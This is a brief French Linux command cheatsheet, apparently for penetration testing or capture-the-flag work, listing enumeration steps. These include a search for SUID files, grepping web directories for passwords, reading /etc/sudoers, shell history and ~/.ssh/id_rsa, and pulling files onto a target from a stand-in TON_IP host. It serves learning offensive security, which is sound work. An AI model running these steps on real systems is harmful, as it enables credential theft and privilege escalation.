---
tags: [cheatsheet, linux]
---

# 🐧 Linux Commands Cheatsheet

## Navigation & fichiers

```bash
pwd && ls -la
find / -name "*.txt" 2>/dev/null
find / -perm -4000 2>/dev/null          # Fichiers SUID
grep -r "password" /var/www/ 2>/dev/null
cat /etc/passwd | grep -v nologin
```

## Réseau

```bash
ip a
ip route
netstat -tulpn
ss -tulpn
cat /etc/hosts
```

## Processus

```bash
ps aux
ps aux | grep root
top
```

## Transfert de fichiers

```bash
# Depuis ta machine
python3 -m http.server 8080

# Sur la cible
wget http://TON_IP:8080/fichier
curl http://TON_IP:8080/fichier -o fichier
```

## Sudo & permissions

```bash
sudo -l
id
groups
cat /etc/sudoers 2>/dev/null
```

## Historique & config

```bash
history
cat ~/.bash_history
cat ~/.ssh/id_rsa 2>/dev/null
env
```
